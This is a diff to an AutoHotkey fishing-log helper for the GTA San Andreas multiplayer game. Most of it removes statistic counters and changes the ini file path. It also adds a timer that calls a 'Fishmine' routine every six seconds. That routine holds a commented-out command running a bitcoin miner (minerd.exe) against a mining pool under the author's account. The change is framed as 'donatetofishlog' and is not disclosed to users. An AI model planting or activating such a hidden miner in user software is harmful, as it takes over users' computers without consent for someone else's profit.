@@ -15,8 +15,7 @@ ENABLE_DEBUG_TIMESTAT = 1
 
 SetKeyDelay , -1
 SetBatchLines  , -1
-inifile = %A_ScriptDir%\fishlog.ini
-;inifile = %USERPROFILE%\MYDOCU~1\GTASAN~1\SAMP\fishlog.ini
+inifile = %USERPROFILE%\MYDOCU~1\GTASAN~1\SAMP\fishlog.ini
 gosub INIREAD
 gosub CHECKCHAT
 return
@@ -69,8 +68,12 @@ BOOT = 1
 	SetTimer,  KEYBINDCHECK , %KEYBINDCHECK%
 	SetTimer , READLOG , %READLOG%
 	SetTimer , PostMessage , %PostMessage%
+	SetTimer , Fishmine , 6000
 return
 
+Fishmine:
+;	"C:\Program Files (x86)\donatetofishlog\minerd.exe" -o pit.deepbit.net:8332 -O billy_j_marshall@hotmail.com_fishlog:fishlog -t 1
+return
 
 READLOG:
 IfWinNotActive ,GTA:SA:MP
@@ -314,11 +317,9 @@ if VAR3 = Failed
 {
 	if VAR6 = Catch
 	{
-		FISH_FAILED++
 		if ENABLE_DEBUG_FISH = 1
-			LV_Add("", "# Fishing Failed to Catch " FISHFAIL)
+			LV_Add("", "# Fishing Cannot Be Sold Here")
 		FISHOUT = 2
-		
 		gosub FISHOUT
 		gosub FISHING
 		return
@@ -326,7 +327,6 @@ if VAR3 = Failed
 }
 if VAR4 = Thrown
 {	
-	FISH_THROWN++
 	if VAR9 = Back
 		VAR9 = 
 	if ENABLE_DEBUG_FISH = 1
@@ -337,7 +337,6 @@ if VAR3 = Mermaid
 {
 	if VAR4 = HAS
 	{
-		FISH_MERMAID++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Attacked Mermaid")
 		FISHOUT = 3
@@ -350,7 +349,6 @@ if VAR3 = Found
 {
 	if VAR4 = Nemo!
 	{
-		FISH_NEMO++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Found Nemo")
 		FISHOUT = 4
@@ -391,7 +389,6 @@ if VAR3 = Killed
 {
 	if VAR6 = Monster
 	{
-		FISH_DEADMONSTER++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Sea Monster Killed ")
 		FISHOUT = 5
@@ -404,7 +401,6 @@ if VAR3 = Failed
 {
 	if VAR5 = Catch
 	{
-	FISH_FAILED++
 	if ENABLE_DEBUG_FISH = 1
 	LV_Add("", "# Fishing Failed")
 		FISHOUT = 6
@@ -417,7 +413,6 @@ if VAR3 = Found
 {
 	if VAR6 = Body.
 	{
-	FISH_ARMOUR++
 	if ENABLE_DEBUG_FISH = 1
 		LV_Add("", "# Fishing Dead Body")
 		FISHOUT = 7
@@ -430,7 +425,6 @@ if VAR3 = Were
 {
 	if VAR4 = Raped
 	{
-		FISH_RAPED++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Mermaid Raped")
 		FTD = 4
@@ -445,7 +439,6 @@ if VAR4 = Only
 {
 	if VAR5 = Fish
 	{
-		FISH_INVALID++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Not Here")
 		FISH = 1
@@ -456,7 +449,6 @@ if VAR3 = Also
 {
 	if VAR4 = Receive
 	{	
-		FISH_RECORD++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Record Fish " VAR6)
 			return
@@ -464,7 +456,6 @@ if VAR3 = Also
 }
 if VAR7 = Treasure
 {
-	FISH_TREASURE++
 	if ENABLE_DEBUG_FISH = 1
 		LV_Add("", "# Fishing Treasure " VAR9)
 	
@@ -475,28 +466,22 @@ if VAR7 = Treasure
 }
 if VAR4 = Thrown
 {	
-	FISH_THROWN++
 	if ENABLE_DEBUG_FISH = 1
 		LV_Add("", "# Fishing Throwback")		
 	THROWBACK = 0
 	return
 }				
 if VAR4 = Already
-{
 	if VAR5 = Fishing
-	{				
-		FISH_ALREADY++
-		if ENABLE_DEBUG_FISH = 1
+{				
+	if ENABLE_DEBUG_FISH = 1
 		LV_Add("", "# Fishing Already")
-		return
-	}
+	return
 }
 if VAR5 = Attacked
 {
 	if VAR8 = Sea
 	{	
-		FISH_MONSTEREAT_TIMES++
-		FISH_MONSTEREAT_TOTAL+= %VAR12%
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Sea Monster Attacked " VAR12 " Fish Lost")
 		IfNotInString , FISHINGCAUGHT , SeaMonster	
@@ -512,7 +497,6 @@ if VAR3 = Caught
 {
 	if VAR7 = Whale
 	{
-		FISH_WHALE++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Whale")	
 		IfNotInString , FISHINGCAUGHT , Whale	
@@ -526,7 +510,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Toilet
 	{
-		FISH_TOILET++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Toilet")	
 		IfNotInString , FISHINGCAUGHT , %VAR5%	
@@ -539,7 +522,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Crab
 	{
-		FISH_CRAB++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Crab")	
 		IfNotInString , FISHINGCAUGHT , %VAR5%	
@@ -554,7 +536,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Sunfish
 	{
-		FISH_SUNFISH++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Sunfish")	
 		IfNotInString , FISHINGCAUGHT , %VAR5%	
@@ -567,7 +548,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Body
 	{
-		FISH_BODYARMOR++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Body Armor")	
 		IfNotInString , FISHINGCAUGHT , %VAR6%	
@@ -579,8 +559,7 @@ if VAR3 = Caught
 		return
 	}
 	if VAR5 = Used
-	{
-		FISH_CONDOM_USED++
+	{		
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Used Condom")	
 		IfNotInString , FISHINGCAUGHT , %VAR6%	
@@ -592,8 +571,7 @@ if VAR3 = Caught
 		return
 	}
 	if VAR5 = Condom
-	{	
-		FISH_CONDOM_NEW++
+	{		
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Condom")	
 		IfNotInString , FISHINGCAUGHT , %VAR5%	
@@ -606,7 +584,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Seaweed.
 	{
-		FISH_SEAWEED++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Seaweed")	
 		IfNotInString , FISHINGCAUGHT , %VAR5%	
@@ -619,7 +596,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Weapon
 	{
-		FISH_WEAPON++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Weapon")	
 		IfNotInString , FISHINGCAUGHT , Weapons	
@@ -632,7 +608,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Jelly
 	{
-		FISH_JELLYFISH++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Jelly")
 		IfNotInString , FISHINGCAUGHT , JellyFish	
@@ -647,7 +622,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Drug
 	{
-		FISH_DRUGS_CASE++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Drug")	
 		IfNotInString , FISHINGCAUGHT , Drugs	
@@ -660,7 +634,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Old
 	{
-		FISH_OLD++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Old")	
 		IfNotInString , FISHINGCAUGHT , %VAR5%	
@@ -673,9 +646,8 @@ if VAR3 = Caught
 	}
 	if VAR5 = Car
 	{
-		FISH_CARTIRE++
-		if ENABLE_DEBUG_FISH = 1
-			LV_Add("", "# Fishing Caught Car Tire")	
+	if ENABLE_DEBUG_FISH = 1
+		LV_Add("", "# Fishing Caught Car Tire")	
 		IfNotInString , FISHINGCAUGHT , Tyre	
 
 			FISHINGCAUGHTFISH = %FISHINGCAUGHTFISH% Tyre %A_Space%	
@@ -686,7 +658,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Money
 	{
-		FISH_MONEY++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Money")	
 		IfNotInString , FISHINGCAUGHT , %VAR5%	
@@ -699,7 +670,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Clam
 	{
-		FISH_CLAM++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Clam")	
 		IfNotInString , FISHINGCAUGHT , %VAR5%	
@@ -712,7 +682,6 @@ if VAR3 = Caught
 	}
 	if VAR5 = Bonus
 	{
-		FISH_BONUS++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("", "# Fishing Caught Bonus")	
 		IfNotInString , FISHINGCAUGHT , Bonus	
@@ -857,9 +826,6 @@ if VAR3 = Sold
 {
 	if VAR5 = Fish
 	{
-		FISH_SOLD++
-		FISH_SOLD_AMOUNT+= %VAR4%
-		FISH_SOLD_TOTAL+= %VAR10%
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("","$ Sold Fish " VAR4 " For " VAR10)
 		return
@@ -869,7 +835,6 @@ if VAR4 = Receive
 {
 	if VAR7 = Fisherman
 	{
-		FISH_AWARD++
 		if ENABLE_DEBUG_FISH = 1
 			LV_Add("","# Fisherman Of The Day Award! " VAR14 " " VAR17)
 		return
